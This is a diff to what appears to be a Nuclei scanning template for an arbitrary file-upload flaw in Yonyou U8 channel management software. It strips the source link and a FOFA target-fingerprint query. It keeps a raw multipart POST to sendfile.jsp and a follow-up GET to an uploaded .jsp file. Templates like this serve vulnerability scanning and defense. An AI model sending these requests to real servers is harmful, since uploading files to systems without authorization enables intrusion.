@@ -3,12 +3,8 @@ info:
   name: 用友U8 渠道管理(高级版)sendfile存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gu5yn0hdcohdlql6'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gu5yn0hdcohdlql6
-    fofa: title="渠道管理（高级版）" ||"common/images/dot.gif" && (icon_hash="737647198" || icon_hash="84729000")
 http:
 - raw:
   - 'POST /business/common/importdata/sendfile.jsp HTTP/1.1
@@ -38,8 +34,6 @@ http:
     ------WebKitFormBoundaryXqK9dR2yTv7wNpLm--
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711680543-80eb1b05-eca8-45f0-b7a3-9990a80a2324.png)
-
     访问后缀'
   redirects: false
   matchers:
@@ -49,9 +43,7 @@ http:
 - raw:
   - 'GET /userfile/default/temp/2c9ff25297c54acc0198742fbc440052.jsp HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711680714-d4412254-55d9-4f98-b12e-c976cff3f04d.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
